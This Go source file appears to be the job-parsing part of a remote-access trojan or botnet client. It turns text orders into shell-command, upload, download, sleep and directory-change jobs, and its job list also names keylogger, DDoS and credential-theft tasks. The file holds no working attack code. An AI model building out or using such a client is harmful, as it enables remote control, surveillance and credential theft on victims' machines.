package main

import (
	"sort"
	"strings"
	"time"
)

type Job struct {
	Id      int       `json:"id"`
	Todo    string    `json:"todo"`
	IsDone  bool      `json:"is_done"`
	Created time.Time `json:"created"`
}

type JobType int

const (
	UNKNOWN JobType = iota
	SHELL_CMD
	UPLOAD
	DOWNLOAD
	CHDIR
	SLEEP
	BOOST
	KEYLOGGER
	DDOS
	CREDENTIALS
)

func (j *Job) parse() (JobType, []string) {
	values := strings.Fields(j.Todo)
	if len(values) == 0 {
		return UNKNOWN, nil
	}
	jobType := values[0]
	jobArgs := values[1:]
	jobArgsN := len(jobArgs)
	if jobType == "cmd" {
		return SHELL_CMD, jobArgs
	} else if jobType == "upload" && jobArgsN == 1 {
		return UPLOAD, jobArgs
	} else if jobType == "download" && jobArgsN == 2 {
		return DOWNLOAD, jobArgs
	} else if jobType == "sleep" && jobArgsN == 1 {
		return SLEEP, jobArgs
	} else if jobType == "boost" && jobArgsN == 1 {
		return BOOST, jobArgs
	} else if jobType == "chdir" && jobArgsN == 1 {
		return CHDIR, jobArgs
	}
	return UNKNOWN, nil
}

func sortJobsByTime(jobs []Job) {
	sort.Slice(jobs, func(i, j int) bool {
		return jobs[i].Created.Before(jobs[j].Created)
	})
}
